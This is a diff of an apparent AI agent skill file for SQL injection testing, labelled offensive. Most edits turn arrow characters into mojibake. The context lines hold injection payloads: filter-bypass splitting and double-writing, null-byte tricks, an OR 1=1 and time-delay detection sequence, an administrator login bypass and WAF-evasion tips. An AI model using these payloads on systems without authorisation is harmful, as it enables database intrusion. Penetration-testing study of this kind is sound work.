@@ -1,9 +1,9 @@
----
+﻿---
 name: sql-injection-testing
 description: "Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms."
 risk: offensive
 source: https://github.com/humaisali
-author: Humais Ali
+Maintained & Curated by: Humais Ali
 date_added: "2026-02-27"
 ---
 
@@ -263,8 +263,8 @@ SEL/*bypass*/ECT
 UN/*bypass*/ION
 
 -- Double writing (if filter removes once)
-SELSELECTECT → SELECT
-UNUNIONION → UNION
+SELSELECTECT â†’ SELECT
+UNUNIONION â†’ UNION
 
 -- Null byte injection
 %00SELECT
@@ -275,11 +275,11 @@ SEL%00ECT
 
 ### Detection Test Sequence
 ```
-1. Insert ' → Check for error
-2. Insert " → Check for error
-3. Try: OR 1=1-- → Check for behavior change
-4. Try: AND 1=2-- → Check for behavior change
-5. Try: ' WAITFOR DELAY '0:0:5'-- → Check for delay
+1. Insert ' â†’ Check for error
+2. Insert " â†’ Check for error
+3. Try: OR 1=1-- â†’ Check for behavior change
+4. Try: AND 1=2-- â†’ Check for behavior change
+5. Try: ' WAITFOR DELAY '0:0:5'-- â†’ Check for delay
 ```
 
 ### Database Fingerprinting
@@ -428,9 +428,9 @@ SELECT * FROM users WHERE username='administrator'--' AND password='anything' --
 - Monitor response length differences instead of content
 
 ### UNION Injection Fails
-- Column count may be incorrect → Test with ORDER BY
-- Data types may mismatch → Use NULL for all columns first
-- Results may not display → Find injectable column positions
+- Column count may be incorrect â†’ Test with ORDER BY
+- Data types may mismatch â†’ Use NULL for all columns first
+- Results may not display â†’ Find injectable column positions
 
 ### WAF Blocking Requests
 - Use encoding techniques (URL, hex, unicode)
@@ -452,3 +452,4 @@ SELECT * FROM users WHERE username='administrator'--' AND password='anything' --
 
 ## When to Use
 This skill is applicable to execute the workflow or actions described in the overview.
+
